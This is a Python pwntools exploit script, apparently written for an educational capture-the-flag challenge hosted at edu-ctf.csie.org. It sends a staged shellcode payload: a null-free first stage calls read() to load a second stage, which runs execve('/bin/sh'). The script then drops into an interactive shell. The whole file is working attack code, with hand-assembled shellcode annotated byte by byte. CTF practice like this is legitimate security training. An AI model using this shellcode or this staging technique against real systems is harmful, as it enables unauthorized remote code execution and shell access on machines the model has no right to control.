from pwn import *

# r = remote('localhost', 15566)
r = remote('edu-ctf.csie.org', 10150)

# read(0, RSP + 0x48, 0x100)
# 0:  49 89 c8                mov    r8,rcx

# 3:  49 83 e8 11             sub    r8,0x11
# 7:  48 c7 c7 02 01 01 01    mov    rdi,0x1010102
# e:  48 81 ef 02 01 01 01    sub    rdi,0x1010102
# 15: 49 89 e1                mov    r9,rsp
# 18: 49 83 c1 48             add    r9,0x48
# 1c: 4c 89 ce                mov    rsi,r9
# 1f: 48 c7 c2 01 02 01 01    mov    rdx,0x1010201
# 26: 48 81 ea 01 01 01 01    sub    rdx,0x1010101
# 2d: 41 ff d0                call   r8
payload = "\x49\x89\xC8\x49\x83\xE8\x11\x48\xC7\xC7\x02\x01\x01\x01\x48\x81\xEF\x02\x01\x01\x01\x49\x89\xE1\x49\x83\xC1\x48\x4C\x89\xCE\x48\xC7\xC2\x01\x02\x01\x01\x48\x81\xEA\x01\x01\x01\x01\x41\xFF\xD0"
r.sendline(payload)

# execve("/bin/sh")
# 0:  48 31 d2                xor    rdx,rdx
# 3:  48 31 f6                xor    rsi,rsi
# 6:  48 bb 2f 2f 62 69 6e    movabs rbx,0x68732f6e69622f2f
# d:  2f 73 68
# 10: 48 c1 eb 08             shr    rbx,0x8
# 14: 53                      push   rbx
# 15: 48 89 e7                mov    rdi,rsp
# 18: b0 3b                   mov    al,0x3b
# 1a: 0f 05                   syscall
payload = "\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\xB0\x3B\x0F\x05"
r.sendline(payload)

r.interactive()
